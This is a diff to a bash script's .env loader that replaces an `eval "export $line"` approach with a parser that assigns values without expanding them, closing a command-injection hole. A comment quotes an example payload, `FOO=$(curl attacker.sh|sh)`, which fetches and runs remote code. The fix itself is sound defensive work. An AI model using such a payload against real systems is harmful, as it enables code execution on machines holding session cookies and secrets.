@@ -27,22 +27,48 @@ note() { printf '  %s%s%s\n' "$C_DIM" "$*" "$C_OFF"; }
 die()  { printf '\n%serror:%s %s\n' "$C_BAD" "$C_OFF" "$*" >&2; exit 1; }
 
 # ---------------------------------------------------------------- env loading
-# Load .env without letting it clobber anything already exported, so a
-# one-off `AMOUNT=... script.sh` on the command line still wins.
+# Assign one KEY=VALUE line without re-interpreting the value.
+#
+# This used to be `eval "export $line"`, which runs whatever the file says:
+# `FOO=$(curl attacker.sh|sh)` executed on source, and the `2>/dev/null || true`
+# hid it. That runs on the machine holding the Venmo cookie. Split on the first
+# `=`, strip one matched pair of quotes, and assign; nothing is expanded.
+assign_env_line() {
+  local line="$1" key value
+  case "$line" in ''|'#'*) return 0;; esac
+  case "$line" in *=*) ;; *) return 0;; esac
+
+  key="${line%%=*}"
+  key="${key#export }"
+  key="$(printf '%s' "$key" | tr -d '[:space:]')"
+  [ -n "$key" ] || return 0
+
+  # A key that is not a shell identifier is not something to export.
+  case "$key" in
+    [!A-Za-z_]*|*[!A-Za-z0-9_]*) return 0;;
+  esac
+
+  value="${line#*=}"
+  # Strip one matched pair of surrounding quotes, the way a .env is written.
+  case "$value" in
+    \"*\") value="${value#\"}"; value="${value%\"}";;
+    "'"*"'") value="${value#\'}"; value="${value%\'}";;
+  esac
+
+  # Only set what the caller has not already set, so a one-off
+  # `AMOUNT=... script.sh` on the command line still wins.
+  if [ -z "${!key:-}" ]; then
+    export "$key=$value"
+  fi
+}
+
+# Load .env without letting it clobber anything already exported.
 load_env() {
   local file="${ZECP2P_ENV_FILE:-$ROOT/.env}"
   [ -f "$file" ] || return 0
-  local line key
+  local line
   while IFS= read -r line || [ -n "$line" ]; do
-    case "$line" in ''|'#'*) continue;; esac
-    key="${line%%=*}"
-    key="${key#export }"
-    key="$(printf '%s' "$key" | tr -d '[:space:]')"
-    [ -n "$key" ] || continue
-    # Only set what the caller has not already set.
-    if [ -z "${!key:-}" ]; then
-      eval "export $line" 2>/dev/null || true
-    fi
+    assign_env_line "$line"
   done < "$file"
 }
 load_env
@@ -66,12 +92,9 @@ DEPLOYED_ENV="${DEPLOYED_ENV:-$STATE_DIR/deployed.$CHAIN_ID.env}"
 # anything the caller set explicitly.
 load_deployed() {
   [ -f "$DEPLOYED_ENV" ] || return 0
-  local line key
+  local line
   while IFS= read -r line || [ -n "$line" ]; do
-    case "$line" in ''|'#'*) continue;; esac
-    key="${line%%=*}"
-    [ -n "$key" ] || continue
-    if [ -z "${!key:-}" ]; then eval "export $line" 2>/dev/null || true; fi
+    assign_env_line "$line"
   done < "$DEPLOYED_ENV"
 }
 
